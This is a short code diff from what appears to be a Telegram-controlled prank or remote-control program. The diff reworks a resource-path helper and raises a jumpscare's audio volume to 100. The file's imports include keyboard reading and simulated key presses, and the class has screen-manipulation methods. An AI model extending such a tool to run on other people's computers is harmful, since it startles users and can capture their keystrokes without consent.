@@ -56,15 +56,10 @@ from keyboard import press as press_key, release as release_key, read_event, KEY
 
 
 def resource_path(relative_path: str) -> str:
-    try:
-        base_path = sys._MEIPASS  # PyInstaller
-    except AttributeError:
-        try:
-            import __main__
-            base_path = dirname(abspath(__main__.__file__))  # Nuitka
-        except:
-            base_path = abspath(".")
-
+    if getattr(sys, 'frozen', False):
+        base_path = dirname(sys.executable)
+    else:
+        base_path = dirname(__file__)
     return join(base_path, relative_path)
 
 logging = False
@@ -895,7 +890,7 @@ class PeppinoTelegram:
             self.modded_screenshot(invert_image)
 
         def johnpork(self, audio=True) -> None:
-            self.jumpscare("johnpork_meme", "johnpork", playaudio=audio, setvolume=50)
+            self.jumpscare("johnpork_meme", "johnpork", playaudio=audio, setvolume=100)
 
         def johnporknoaudio(self) -> None:
             self.johnpork(False)
